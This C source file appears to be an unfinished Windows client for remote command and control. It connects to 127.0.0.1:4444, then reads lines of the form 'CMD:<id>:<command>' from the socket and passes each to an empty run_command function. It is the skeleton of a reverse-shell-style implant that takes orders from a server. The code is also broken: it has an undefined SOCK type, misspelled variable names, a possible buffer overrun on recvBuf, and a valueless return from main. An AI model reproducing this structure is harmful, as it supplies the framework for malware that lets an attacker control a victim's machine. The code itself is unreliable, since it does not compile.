#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define IP_SERVER "127.0.0.1"
#define PORT_SERVER 4444

VOID run_command(SOCK sock, char* cmdID, char* cmdStr) {
    
}


int main() {
    int err;
    WORD wVersionRequested;
    WSADATA wsa;
    SOCK sock;
    struct sockaddr_in sin;

    char recvBuf[1024];
    char parseBuf[2048] = {0};
    int parselen = 0;

    vVersionRequested = MAKEWORD(2,2);

    err = WSAStartup( wVersionRequested, &wsa );
    if (err != 0) {
        printf("Could not find a usable WinSock DLL\n");
        return;
    }

    sin.sin_addr.s_addr = inet_addr(IP_SERVER);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT_SERVER);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bind(sock, (struct sockaddr*)&sin, sizeof(sin));

    connect(sock, (struct sockaddr*)&sin, sizeof(sin));

    while(1) {
        int received = recv(sock, recvBuf, sizeof(recvBuf), 0);
        if (received <= 0) break;

        recvBuf[received] = '\0';
        if (parselen + received >= sizeof(parseBuf)) parseLen = 0;
        memcpy(parseBuf + parseLen, recvBuf, received);
        parseLen += received;
        parseBuf[parseLen] = '\0';

        char* lineStart = parseBuf;
        char* newline;
        while ((newline = strchr(lineStart, '\n')) != NULL) {
            *newline = '\0'; // couper la ligne
            if (strncmp(lineStart, "CMD:", 4) == 0) {
                // Format: CMD:<id>:<commande>
                char* cmdID = lineStart + 4;
                char* cmdStr = strchr(cmdID, ':');
                if (cmdStr) {
                    *cmdStr = '\0';
                    cmdStr++;
                    run_command(sock, cmdID, cmdStr);
                }
            }
            lineStart = newline + 1;
        }

        // décaler le reste non traité au début du buffer
        parseLen = strlen(lineStart);
        memmove(parseBuf, lineStart, parseLen);

    }



    closesocket(sock);
    WSACleanup();
    return 0;
}